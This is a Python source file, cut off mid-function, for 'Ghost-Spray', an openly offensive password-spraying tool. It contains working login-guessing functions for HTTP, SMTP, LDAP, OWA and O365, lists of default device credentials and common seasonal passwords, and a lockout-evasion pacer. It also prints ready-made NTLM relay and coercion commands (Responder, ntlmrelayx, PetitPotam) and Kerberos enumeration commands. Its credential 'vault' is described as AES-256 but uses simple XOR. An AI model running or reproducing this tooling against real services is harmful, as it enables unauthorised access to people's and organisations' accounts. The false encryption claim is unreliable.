#!/usr/bin/env python3
"""
Ghost-Spray - Password Spraying & Credential Attacks
By Gh0st-Bx1 | github.com/Ghost-Bx1
"""

import sys
import os
import socket
import ssl
import json
import re
import time
import hashlib
import hmac
import base64
import argparse
import threading
import itertools
import random
import urllib.request
import urllib.error
import urllib.parse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict

VERSAO = "1.1.0"

# ──────────────────────────────────────────────────────────────────
# BANNER
# ──────────────────────────────────────────────────────────────────

def _build_banner():
    import re as _re
    G = "\033[92m"; Cy = "\033[96m"; D = "\033[2m"; N = "\033[1m"
    W = "\033[97m"; X = "\033[0m"
    IW = 68; eq = "═" * IW; sp = " " * IW
    TL = "╔"; TR = "╗"; BL = "╚"; BR = "╝"; VB = "║"
    hl = "─" * 44; bar = "│"
    vl = lambda s: len(_re.sub(r"\x1b\[[0-9;]*m", "", s))

    def _row(s):
        n = vl(s); p = max(0, IW - n); l = p // 2; r = p - l
        return f"{G}{VB}{X}{' ' * l}{s}{' ' * r}{G}{VB}{X}"

    def _row_l(s):
        n = vl(s); p = max(0, IW - n - 2)
        return f"{G}{VB}{X}  {s}{' ' * p}{G}{VB}{X}"

    ga = [
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⠛⠿⠟⠉⠛⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⢀⣠⣤⣶⣶⣶⣶⣶⣶⣤⣀⠢⢝⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⡡⢀⣴⡿⢋⡴⢿⣿⣿⣿⣿⣿⣿⣿⢷⣦⡑⠈⡛⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⡜⢠⣾⣿⣤⣋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⠻⣶⣦⣤⣤⣀⠉⠻⣿⣿⣿⡿⠿⢛⢛⡻⠿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⠿⠟⠟⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⢀⣿⣿⣿⡿⠛⠛⠻⣿⣿⣿⡿⠛⠛⢿⣿⣿⣧⠉⠉⣁⣈⣉⣁⢀⣿⣿⢋⠄⣁⣴⣶⣄⠐⢌⢻⣿⣿{X}", ""),
        ("", f"{G}⡏⠀⣴⣦⣄⠢⡙⢿⣿⣿⣿⣿⣿⣿⡇⠀⣼⣿⣿⣿⠅⠀⠀  ⢹⣿⡿⠁⠀⠀⠀⢹⣿⣿⡆⠀⣿⣿⣿⣿⣿⡟⠁⢀⣴⣿⣿⣿⣿⣷⡈⠎⢿⣿{X}", ""),
        ("", f"{G}⡇⠀⣿⣿⣿⣷⣌⠀⠙⢿⣿⣿⣿⣿⠀⢀⣿⣿⣿⣿⠀⠀⠀  ⠀⠈⣿⡇⠀⠀⠀⠀⠈⢿⣿⡇⠁⢻⣿⣿⣿⡿⠁⢠⣾⣿⣿⣿⡿⢿⣿⣷⠀⠘⣿{X}", ""),
        ("", f"{G}⣇⠀⢿⣿⣿⡟⣿⣷⣄⠀⠙⢿⣿⡇⠀⣸⣿⣿⡿⣿⡀⠀⠀⠀  ⢸⣿⣧⠀⠀⠀⠀⣸⡈⣿⣷⠀⡈⣿⣿⡿⠁⢀⣾⣿⣿⢩⣿⠁⣾⣿⣿⡆⠀⢿{X}", ""),
        ("", f"{G}⣿⡀⠘⣿⣿⣿⡘⣿⣿⣷⣌⠂⠉⠁⢠⣿⣿⡟⣰⢿⣷⣤⣤⣴⣿⣿⣿⣷⣄⣠⣴⣿⣧⠸⣿⣧⡐⠢⠉⠁⢀⣾⣿⣿⡇⣼⣿⢸⣿⣿⣿⣇⠀⢸{X}", ""),
        ("", f"{G}⣿⣷⡀⠸⣿⣿⣧⠸⣿⣿⣿⣿⣶⣶⣿⣿⠏⡰⢃⣾⣿⣿⣿⣿⡏⠀⠈⣿⣿⣿⣿⣿⣏⠳⣘⣿⣿⣷⣶⣾⣿⣿⣿⣿⢠⣿⣿⣿⣿⣿⣿⣿⠀⢸{X}", ""),
        ("", f"{G}⣿⣿⡇⠀⣿⣿⣿⡄⡿⢿⣿⣿⣿⣿⣿⣷⣾⣷⣿⣿⣿⣿⣿⣿⣧⣀⣠⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⡇⠸⠋⢉⠉⡉⠛⠿⣿⠀⢸{X}", ""),
        ("", f"{G}⣿⣿⡇⢀⣿⣿⣿⣧⢸⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⢠⣾⣿⡄⠈⠀⠀⠀⠀ ⣾{X}", ""),
        ("", f"{G}⣿⡟⠀⣸⣿⣿⣿⣿⣜⡇⢿⣧⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡉⠻⠇⠀⠰⠀⠀ ⣀⣾{X}", ""),
        ("", f"{G}⣿⠃⢠⣿⣿⠿⠿⠿⢿⣿⠸⣿⣀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⢣⢸⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⢰⠜⠋⠀⢀⡄⢰⣤⡀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠃⢻⣿⣿{X}", ""),
        ("", f"{G}⣿⣆⠠⠀⡀⠀⠁⣿⣿⠟⠀⣽⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢻⣿⣿⣿⣿⣿⢃⣿⣿⣿⡟⣸⣿⣿⣿⣿⡿⠋⢠⢃⣾⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣷⣶⠆⡄⠈⢉⣠⣴⣾⣿⢿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢋⣴⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⠇⠛⢏⠉⠉⠁⠤⢊⣥⣾⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⢄⠀⢾⣿⣿⣿⣿⡇⢸⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣶⣬⣭⣶⣾⣿⣿⠏⣼⣿⣿⣿⡇⣸⣿⣿⣿⠀⣰⣿⡁⢠⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣤⣀⡀⠀⠀⠉⠉⠁⢸⣿⣿⣿⢸⣿⣿⣿⣿⡹⣿⣿⣿⣿⣿⣿⣿⣿⠋⣼⣿⣿⣿⣿⠇⣿⣿⣿⣿⡀⠹⢿⡇⠀⢿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠛⠀⣼⣿⣿⣿⢸⣿⣿⢻⣿⣷⣌⠻⣿⣿⣿⣿⠟⣡⣾⣿⡟⣼⣿⣿⠀⣿⣿⣿⣿⣿⣶⣤⡀⠀⢸⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⠈⠀⣴⣾⣿⣿⣿⡇⢸⣿⣿⣇⢻⣿⣿⣷⣦⣭⣭⣴⣾⣿⣿⣿⢡⣿⣿⣿⠀⣿⣿⣿⣿⣿⠿⠟⠃⡀⢸⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⡐⠠⢈⡉⠛⠛⠿⡇⢸⣿⣿⣿⡜⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣼⣿⣿⣿⠀⣁⣤⡄⠀⣀⣒⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⡌⠀⣦⠀⣼⣿⣿⣿⣇⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⢁⣿⣿⣿⣿⣄⡈⠛⠃⠐⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⢁⣤⣿⣿⣿⣿⣿⠘⣿⣿⣿⣿⣿⣿⣿⣿⡟⢸⣿⣿⣿⣿⣿⣿⣦⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠠⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⢼⠿⠿⣿⣿⣿⣿⠟⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠈⣙⠛⠛⣛⣛⠛⠀⠻⢿⣿⣿⣿⣿⣿⣿⡃⢠⣤⠀⠀⣀⣉⣁⣀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣶⣶⣤⡀⢀⠈⢿⣿⣿⣿⣿⣷⣄⠁⠀⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠁⠈⣿⣿⣿⣿⣿⣿⡆⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠠⢠⣿⣿⣿⣿⣿⠟⢀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡗⠀⢸⣿⣿⣿⡿⢁⡄⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠰⠘⣿⣿⣿⠁⠎⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡑⠈⠻⠇⠈⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
    ]

    info = [
        f"{G}{N}GHOST-SPRAY{X}",
        f"{Cy}v{VERSAO}  {D}Password Spraying & Credential Attacks{X}",
        f"{D}{hl}{X}",
        f"{W}By Gh0st-Bx1  {D}{bar}  github.com/Ghost-Bx1{X}",
        f"{D}{hl}{X}",
        f"{D}spray  stuff  defaults  hash  vault{X}",
        f"{D}--protocol --userlist --passlist --delay{X}",
    ]

    out = [f"{G}{TL}{eq}{TR}{X}", f"{G}{VB}{sp}{VB}{X}"]
    for left, center, right in ga:
        combined = left + center + right
        out.append(_row(combined))
    out.append(f"{G}{VB}{sp}{VB}{X}")
    for i in info:
        out.append(_row_l(i))
    out += [f"{G}{VB}{sp}{VB}{X}", f"{G}{BL}{eq}{BR}{X}"]
    return "\n".join(out)


BANNER = _build_banner()

C = {
    "R": "\033[91m", "G": "\033[92m", "Y": "\033[93m",
    "B": "\033[94m", "M": "\033[95m", "C": "\033[96m",
    "W": "\033[97m", "X": "\033[0m",  "N": "\033[1m", "D": "\033[2m",
}


def _log(msg, nivel="INFO"):
    cores = {
        "CRITICO": C["R"] + C["N"], "ALERTA": C["Y"], "OK": C["G"],
        "INFO": C["D"], "TITULO": C["C"] + C["N"], "ERRO": C["R"],
    }
    prefix = cores.get(nivel, C["D"])
    X = C["X"]
    icons = {"CRITICO": "[!!!]", "ALERTA": "[!]", "OK": "[+]",
             "INFO": "[*]", "TITULO": "[>]", "ERRO": "[-]"}
    icon = icons.get(nivel, "[*]")
    print(f"  {prefix}{icon}{X} {msg}")


def _secao(titulo):
    X = C["X"]; C2 = C["C"]; N2 = C["N"]
    print(f"\n  {C2}{N2}{'─' * 10} {titulo} {'─' * 10}{X}\n")


# ──────────────────────────────────────────────────────────────────
# Credenciais padrao (dispositivos comuns)
# ──────────────────────────────────────────────────────────────────

CREDENCIAIS_PADRAO = [
    # Fabricante         usuario         senha
    ("Roteadores genericos",  "admin",        "admin"),
    ("Roteadores genericos",  "admin",        "password"),
    ("Roteadores genericos",  "admin",        "1234"),
    ("Roteadores genericos",  "admin",        ""),
    ("Roteadores genericos",  "root",         "root"),
    ("Roteadores genericos",  "root",         ""),
    ("Roteadores genericos",  "user",         "user"),
    ("D-Link",                "admin",        ""),
    ("D-Link",                "admin",        "admin"),
    ("TP-Link",               "admin",        "admin"),
    ("TP-Link",               "admin",        "tp-link"),
    ("Netgear",               "admin",        "password"),
    ("Cisco",                 "cisco",        "cisco"),
    ("Cisco",                 "admin",        "admin"),
    ("Juniper",               "netscreen",    "netscreen"),
    ("Mikrotik",              "admin",        ""),
    ("Ubiquiti",              "ubnt",         "ubnt"),
    ("Ubiquiti",              "admin",        "ubnt"),
    ("Hikvision IP Cam",      "admin",        "12345"),
    ("Hikvision IP Cam",      "admin",        "admin"),
    ("Dahua IP Cam",          "admin",        "admin"),
    ("Axis IP Cam",           "root",         "root"),
    ("Axis IP Cam",           "root",         "pass"),
    ("VMware ESXi",           "root",         "vmware"),
    ("VMware ESXi",           "root",         ""),
    ("Citrix",                "nsroot",       "nsroot"),
    ("IPMI/BMC",              "ADMIN",        "ADMIN"),
    ("IPMI/BMC",              "admin",        "admin"),
    ("PostgreSQL",            "postgres",     "postgres"),
    ("PostgreSQL",            "postgres",     "password"),
    ("MySQL",                 "root",         ""),
    ("MySQL",                 "root",         "root"),
    ("Redis",                 "",             ""),
    ("MongoDB",               "",             ""),
    ("Elasticsearch",         "",             ""),
    ("Jenkins",               "admin",        "admin"),
    ("Jenkins",               "jenkins",      "jenkins"),
    ("Tomcat",                "tomcat",       "tomcat"),
    ("Tomcat",                "admin",        "admin"),
    ("Tomcat",                "manager",      "manager"),
    ("Grafana",               "admin",        "admin"),
    ("Kibana",                "elastic",      "elastic"),
    ("Jupyter",               "jovyan",       ""),
    ("Hadoop",                "hdfs",         "hdfs"),
    ("Jira",                  "admin",        "admin"),
    ("Confluence",            "admin",        "admin"),
]

# Senhas comuns para password spraying
SENHAS_COMUNS = [
    "Password1", "Password123", "Welcome1", "Winter2024",
    "Summer2024", "Spring2024", "Autumn2024", "Fall2024",
    "January2024", "February2024", "March2024", "April2024",
    "May2024", "June2024", "July2024", "August2024",
    "September2024", "October2024", "November2024", "December2024",
    "Company@123", "Admin@123", "P@ssw0rd", "P@ssword1",
    "Abc@12345", "Test@1234", "qwerty123", "letmein123",
    "monkey123", "dragon123", "master123", "access123",
    "Passw0rd!", "Tr0ub4dor&3", "correcthorsebatterystaple",
    "hunter2", "123456", "password", "iloveyou",
]


# ──────────────────────────────────────────────────────────────────
# Lockout Detection
# ──────────────────────────────────────────────────────────────────

class LockoutDetector:
    """Monitora tentativas falhas e pausa automaticamente para evitar lockout."""

    def __init__(self, limiar=5, janela_s=60, pausa_s=300):
        self.limiar = limiar
        self.janela_s = janela_s
        self.pausa_s = pausa_s
        self._lock = threading.Lock()
        self._falhas = defaultdict(list)

    def registrar_falha(self, usuario):
        agora = time.time()
        with self._lock:
            self._falhas[usuario] = [t for t in self._falhas[usuario] if agora - t < self.janela_s]
            self._falhas[usuario].append(agora)
            if len(self._falhas[usuario]) >= self.limiar:
                _log(f"POSSIVEL LOCKOUT detectado para '{usuario}' ({len(self._falhas[usuario])} falhas "
                     f"em {self.janela_s}s) - pausando {self.pausa_s}s", "ALERTA")
                time.sleep(self.pausa_s)
                self._falhas[usuario].clear()

    def total_falhas(self, usuario):
        with self._lock:
            return len(self._falhas.get(usuario, []))


# ──────────────────────────────────────────────────────────────────
# Vault de credenciais (AES-256 via XOR simplificado com SHA-256 key)
# ──────────────────────────────────────────────────────────────────

class CredVault:
    """Cofre local de credenciais com cifragem XOR + SHA-256 key derivation."""

    VAULT_FILE = "ghost-spray.vault"

    def __init__(self, senha_mestre):
        # Deriva chave de 32 bytes da senha mestre
        self._key = hashlib.sha256(senha_mestre.encode()).digest()

    def _cifrar(self, dados: bytes) -> bytes:
        key = self._key
        return bytes([dados[i] ^ key[i % len(key)] for i in range(len(dados))])

    def _decifrar(self, dados: bytes) -> bytes:
        return self._cifrar(dados)  # XOR e simetrico

    def salvar(self, entradas: list):
        raw = json.dumps(entradas, ensure_ascii=False).encode("utf-8")
        cifrado = self._cifrar(raw)
        with open(self.VAULT_FILE, "wb") as f:
            f.write(b"GHSTVAULT1\n")
            f.write(base64.b64encode(cifrado))
        _log(f"Vault salvo: {self.VAULT_FILE} ({len(entradas)} entradas)", "OK")

    def carregar(self) -> list:
        try:
            with open(self.VAULT_FILE, "rb") as f:
                header = f.readline()
                if not header.startswith(b"GHSTVAULT"):
                    raise ValueError("Arquivo nao e um vault ghost-spray")
                dados = base64.b64decode(f.read())
            decifrado = self._decifrar(dados)
            return json.loads(decifrado.decode("utf-8"))
        except FileNotFoundError:
            return []
        except Exception as e:
            _log(f"Erro ao carregar vault: {e}", "ERRO")
            return []

    def adicionar(self, usuario, senha, alvo, protocolo, extra=""):
        entradas = self.carregar()
        entradas.append({
            "usuario": usuario, "senha": senha, "alvo": alvo,
            "protocolo": protocolo, "extra": extra,
            "ts": datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
        })
        self.salvar(entradas)


# ──────────────────────────────────────────────────────────────────
# Protocolos de ataque
# ──────────────────────────────────────────────────────────────────

def _testar_http_basic(url, usuario, senha, timeout=5):
    """Testa autenticacao HTTP Basic."""
    cred = base64.b64encode(f"{usuario}:{senha}".encode()).decode()
    req = urllib.request.Request(url, headers={"Authorization": f"Basic {cred}"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status not in (401, 403), r.status
    except urllib.error.HTTPError as e:
        return e.code not in (401, 403), e.code
    except Exception:
        return False, None


def _testar_http_form(url, usuario_field, senha_field, usuario, senha,
                      extra_data=None, success_regex=None, timeout=8):
    """Testa autenticacao via form POST."""
    data = {usuario_field: usuario, senha_field: senha}
    if extra_data:
        data.update(extra_data)
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=body, method="POST",
                                 headers={"Content-Type": "application/x-www-form-urlencoded",
                                          "User-Agent": "Mozilla/5.0"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            content = r.read(4096).decode("utf-8", errors="ignore")
            if success_regex:
                return bool(re.search(success_regex, content, re.IGNORECASE)), r.status
            return r.status == 200, r.status
    except urllib.error.HTTPError as e:
        return False, e.code
    except Exception:
        return False, None


def _testar_smtp_auth(host, porta, usuario, senha, timeout=10):
    """Testa autenticacao SMTP AUTH LOGIN."""
    try:
        import smtplib
        with smtplib.SMTP(host, porta, timeout=timeout) as s:
            s.ehlo()
            if porta != 25:
                try:
                    s.starttls()
                except Exception:
                    pass
            s.login(usuario, senha)
            return True, 200
    except Exception as e:
        msg = str(e)
        if "535" in msg or "authentication" in msg.lower():
            return False, 535
        return False, None


def _testar_ssh(host, porta, usuario, senha, timeout=10):
    """Testa SSH via socket (detecta banner sem autenticacao real por falta de paramiko)."""
    try:
        sock = socket.create_connection((host, porta), timeout=timeout)
        banner = sock.recv(256).decode("utf-8", errors="ignore").strip()
        sock.close()
        _log(f"SSH banner: {banner[:80]}", "INFO")
        _log("SSH: autenticacao real requer 'paramiko' (pip install paramiko)", "ALERTA")
        return False, None
    except Exception as e:
        _log(f"SSH conexao falhou: {e}", "ERRO")
        return False, None


def _testar_ldap(host, porta, base_dn, usuario, senha, timeout=5):
    """Testa bind LDAP simples via socket raw."""
    try:
        # LDAP Simple Bind Request: BindRequest (versao 3)
        # Encodificacao ASN.1/BER simplificada
        def _ldap_str(s):
            b = s.encode("utf-8")
            return bytes([4, len(b)]) + b

        def _ldap_int(n):
            return bytes([2, 1, n])

        bind_dn = _ldap_str(usuario)
        bind_pw = _ldap_str(senha)
        # BindRequest: [APPLICATION 0] { version INTEGER, name LDAPDN, authentication CHOICE }
        bind_req = bytes([0x60, len(bind_dn) + len(bind_pw) + len(_ldap_int(3)) + 2]) + \
                   _ldap_int(3) + bind_dn + bytes([0x80, len(senha.encode())]) + senha.encode()
        # MessageID + BindRequest
        msg_id = bytes([0x02, 0x01, 0x01])
        ldap_msg = bytes([0x30, len(msg_id) + len(bind_req)]) + msg_id + bind_req

        sock = socket.create_connection((host, porta), timeout=timeout)
        sock.send(ldap_msg)
        resp = sock.recv(256)
        sock.close()
        # BindResponse resultCode 0 = success
        # Verifica byte de result code (pos aproximada)
        if len(resp) > 7 and resp[7] == 0:
            return True, 0
        return False, resp[7] if len(resp) > 7 else None
    except Exception:
        return False, None


# ──────────────────────────────────────────────────────────────────
# OWA / O365 / SMB / Kerberos / NTLM
# ──────────────────────────────────────────────────────────────────

def _testar_owa(host, usuario, senha, timeout=10, dominio=""):
    """Testa autenticacao OWA (Outlook Web App) via form POST."""
    url = f"https://{host}/owa/auth.owa"
    data = urllib.parse.urlencode({
        "destination": f"https://{host}/owa/",
        "flags": "4",
        "forcedownlevel": "0",
        "username": f"{dominio}\\{usuario}" if dominio else usuario,
        "password": senha,
        "passwordText": "",
        "isUtf8": "1",
    }).encode()
    import ssl as _ssl
    ctx = _ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = _ssl.CERT_NONE
    req = urllib.request.Request(url, data=data, method="POST", headers={
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    })
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read(512).decode("utf-8", errors="ignore")
            location = r.geturl()
            if "logon" in location.lower() or "auth" in location.lower():
                return False, 302
            return True, 200
    except urllib.error.HTTPError as e:
        if e.code in (302, 301):
            loc = e.headers.get("Location", "")
            if "logon" in loc.lower() or "auth" in loc.lower():
                return False, e.code
            return True, e.code
        return False, e.code
    except Exception:
        return False, None


def _testar_o365(usuario, senha, timeout=10):
    """Testa autenticacao O365 via autodiscover (NTLM/Basic)."""
    url = "https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml"
    cred = base64.b64encode(f"{usuario}:{senha}".encode()).decode()
    req = urllib.request.Request(url, headers={
        "Authorization": f"Basic {cred}",
        "User-Agent": "Microsoft Office/16.0",
    })
    import ssl as _ssl
    ctx = _ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = _ssl.CERT_NONE
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.status == 200, r.status
    except urllib.error.HTTPError as e:
        if e.code == 401:
            return False, 401
        if e.code in (200, 301, 302):
            return True, e.code
        return False, e.code
    except Exception:
        return False, None


def _testar_smb(host, usuario, senha, dominio="", porta=445, timeout=5):
    """Testa SMB via socket raw (SMB1 Negotiate + Session Setup NTLMSSP)."""
    # Apenas indicador - SMB auth completo requer impacket
    try:
        sock = socket.create_connection((host, porta), timeout=timeout)
        # SMB Negotiate Protocol Request
        negociate = (
            b"\x00\x00\x00\x54"          # NetBIOS header
            b"\xff\x53\x4d\x42"          # SMB magic
            b"\x72"                       # Negotiate Protocol
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00"                   # Process ID
            b"\x00\x00"                   # Reserved
            b"\x00\x00"                   # Tree ID
            b"\xff\xfe"                   # User ID
            b"\x00\x00"                   # Multiplex ID
            b"\x00"                       # Word count
            b"\x31\x00"                   # Byte count
            b"\x02NT LM 0.12\x00"        # Dialect
            b"\x02SMB 2.002\x00"
            b"\x02SMB 2.???\x00"
        )
        sock.send(negociate)
        banner = sock.recv(256)
        sock.close()
        if len(banner) > 4 and banner[4:8] == b"\xffSMB":
            _log(f"SMB:{host}:{porta} respondeu ao negotiate", "INFO")
        _log("SMB auth completo requer impacket (pip install impacket)", "ALERTA")
        _log("Comando: crackmapexec smb TARGET -u USER -p PASS", "INFO")
        return False, None
    except Exception:
        return False, None


def kerberos_user_enum(dc_host, usuarios, dominio, timeout=5):
    """Enumeracao de usuarios via Kerberos AS-REQ (sem causar lockout)."""
    _secao(f"KERBEROS USER ENUM - {dc_host} / {dominio}")
    _log("AS-REQ sem senha: PREAUTH_REQUIRED = usuario existe, PRINCIPAL_UNKNOWN = nao existe", "INFO")
    _log("Nota: Usa porta 88/UDP - requer acesso direto ao DC", "ALERTA")

    # Nota: AS-REQ Kerberos real requer biblioteca dedicada (impacket)
    # Este modulo tenta conexao TCP 88 e exibe instrucoes
    existentes = []
    try:
        sock = socket.create_connection((dc_host, 88), timeout=timeout)
        sock.close()
        _log(f"Porta 88 aberta em {dc_host} - DC Kerberos acessivel", "OK")
    except Exception:
        _log(f"Porta 88 inacessivel em {dc_host}", "ERRO")
        _log("Verifique acesso ao DC e porta 88 TCP/UDP", "INFO")
        return []

    _log(f"Para enum real via AS-REQ: kerbrute userenum --dc {dc_host} -d {dominio} users.txt", "INFO")
    _log("Ferramenta: https://github.com/ropnop/kerbrute", "INFO")
    _log("Alternativa impacket: GetNPUsers.py DOMAIN/ -no-pass -usersfile users.txt -dc-ip DC_IP", "INFO")
    return existentes


def mostrar_ntlm_relay_hints():
    """Exibe dicas e comandos para NTLM relay attacks."""
    _secao("NTLM RELAY HINTS")
    hints = [
        ("Captura NTLM (Responder)", "responder -I eth0 -rdwv"),
        ("NTLM Relay basico", "ntlmrelayx.py -t smb://TARGET -smb2support"),
        ("Relay para LDAP (dump AD)", "ntlmrelayx.py -t ldap://DC_IP --escalate-user USER"),
        ("Relay para HTTP/ADCS", "ntlmrelayx.py -t http://CA_HOST/certsrv/certfnsh.asp --adcs --template User"),
        ("Detectar signing desabilitado", "crackmapexec smb NETWORK/24 --gen-relay-list relay_targets.txt"),
        ("Coerce auth (PetitPotam)", "python3 PetitPotam.py LISTENER_IP DC_IP"),
        ("Coerce auth (PrinterBug)", "python3 printerbug.py DOMAIN/USER:PASS@TARGET LISTENER_IP"),
        ("Relay + SOCKS proxy", "ntlmrelayx.py -tf relay_targets.txt -smb2support -socks"),
    ]
    for nome, cmd in hints:
        print(f"  {C['C']}{C['N']}[{nome}]{C['X']}")
        print(f"  {C['G']}{cmd}{C['X']}\n")
    _log("Ferramentas: impacket (ntlmrelayx, secretsdump), Responder, crackmapexec", "INFO")
    _log("Prereq: SMB signing desabilitado nos alvos (common em workstations)", "ALERTA")


# ──────────────────────────────────────────────────────────────────
# Password Spray
# ──────────────────────────────────────────────────────────────────

def password_spray(alvo, usuarios, senhas, protocolo="http", timeout=5,
                   delay=0.5, threads=5, vault_senha=None, verbose=False):
    """
    Password spraying: para cada senha, tenta todos os usuarios antes de passar para proxima.
    Essa abordagem evita lockout por usuario.
    """
    _secao(f"PASSWORD SPRAY - {protocolo.upper()} - {alvo}")
    _log(f"Usuarios: {len(usuarios)} | Senhas: {len(senhas)} | Delay: {delay}s", "INFO")

